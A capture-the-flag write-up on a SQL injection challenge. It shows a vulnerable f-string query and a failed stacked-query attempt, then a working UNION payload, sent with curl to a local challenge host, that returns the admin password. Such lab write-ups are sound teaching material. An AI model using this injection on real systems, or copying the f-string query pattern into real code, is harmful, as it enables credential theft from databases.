# SQL Injection 3

In this challenge, we are given a user query service. We are given only 1 GET endpoint, that will read a query parameter
and inject into an SQL statement like so:

```python
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
```

The goal here is to figure out how to chain commands. My first thought was to use a `;` and craft the SQL statement like so:

```sql
SELECT username FROM users WHERE username LIKE "admin"; SELECT password FROM users WHERE username = "admin"
                                                ^ Crafted by attacker
```

The first statement will simply return `admin`. The second statement will return admin's password, the flag. This is valid, however,
the server throws an error stating that `sqlite3` only allows one request at a time.

I then tried to use the `UNION` set operator. This will combine the rows of multiple statements into one table, if the number of columns is the
same between each of query outputs. For our case, both parts of the query return just 1 column, so we are good here.

This is what the query will look like:

```sql
SELECT username FROM users WHERE username LIKE "admin" UNION SELECT password FROM users WHERE username = "admin"
                                                ^ Crafted by attacker
```

This is what the payload looks like:

```bash
curl -G --data-urlencode 'query=admin" UNION SELECT password FROM users where username="admin' 'challenge.localhost:80/' -b cookie.txt
```

Note how we are closing the first query using a `"`, then writing the second query after the UNION. And just like in the previous challenge,
since there already exists a closing `"`, we don't add a closing `"` at the end of the parameter.

In the html response, this returns the first query (`admin`) and the flag!
